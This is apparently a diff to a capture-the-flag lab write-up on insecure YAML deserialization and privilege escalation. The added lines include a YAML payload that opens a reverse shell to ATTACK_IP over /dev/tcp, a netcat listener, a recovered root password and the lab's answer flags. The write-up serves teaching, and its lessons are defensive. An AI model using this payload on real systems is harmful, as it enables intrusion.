@@ -64,7 +64,8 @@ nc -lnvp 4444
 So, now we want the website input box to send a connection to my system terminal. 
 
 ```
-!!python/object/
+!!python/object/apply:os.system
+["bash -c 'bash -i >& /dev/tcp/ATTACK_IP/4444 0>&1'"]
 ```
 
 <img width="1065" height="615" alt="image" src="https://github.com/user-attachments/assets/bf72e126-c237-4718-92b9-a5df889b5dd2" />
@@ -88,23 +89,34 @@ And we found the user flag.
 **What is the user flag?** <br>
 THM{y4ml_pl4yl1st_pwns_th3_b34ch}
 
-Next we need to do privilege escalation and get the root flag by obtaining the root user account. I'm using a separate shell for that using python.
+Next we need to do privilege escalation and get the root flag by obtaining the root user account. I'm going to enumerate the process and see how it goes.
 
-```
-```
+<img width="1400" height="717" alt="image" src="https://github.com/user-attachments/assets/23b92a58-ab51-488a-8c06-3a72fbb3baea" />
 
-<img width="1213" height="182" alt="image" src="https://github.com/user-attachments/assets/3f5d942d-b804-4381-8798-2ee285f4e380" />
+While seeing through the processes, I found something interesting. I got some username and password which I'm guessing it to be the root user's credential. It's because we see concierge talking about the jukebox and so thought this could be relevant
 
-then CTRL + Z to background operation and come to our own system terminal
+<img width="1902" height="104" alt="image" src="https://github.com/user-attachments/assets/57c06d16-978f-4f67-99c8-6deb94a4195a" />
 
-in that 
+I used the password with the following commands. I gained access to the the root user using ```su```, then gave the password as **SunsetSpritz2024!**, and we got the root access. Next I did ```pwd``` to see in which directory I am in. Then did ```cd``` to change the directory and did ```ls``` to list the files, from here I got the **root.txt** file, and then I used ```cat root.txt``` command to read the contents of the file and here we got the flag for the root user.
 
-```
-stty raw -echo
-```
-<img width="1636" height="213" alt="image" src="https://github.com/user-attachments/assets/6d76fb1f-ab53-483e-8a6b-cd9dce0c8b34" />
+**What is the root flag?** <br>
+THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
 
-got the password
+<img width="1292" height="448" alt="image" src="https://github.com/user-attachments/assets/9bf477b3-6014-4ee2-ac12-2d74a568a193" />
+
+## Lessons Learned
+
+* **Insecure YAML Deserialization (RCE):** Passing user-controlled data directly into deserializers (like `yaml.load`) without sanitization leads to Remote Code Execution. Always use safe parsers (e.g., `yaml.safe_load`) to handle untrusted input.
+* **Avoid Hardcoded & Exposed Process Credentials:** Storing credentials or sensitive commands in plain text within active processes or scripts allows local users to easily inspect process lists (`ps aux`) and escalate privileges.
+* **Never Rely on Client-Side Isolation:** Relying on client-side JavaScript to enforce data isolation provides zero real security. Authorization and access control must always be enforced at the API and backend layers.
+
+
+
+
+
+
+
+
 
 
 
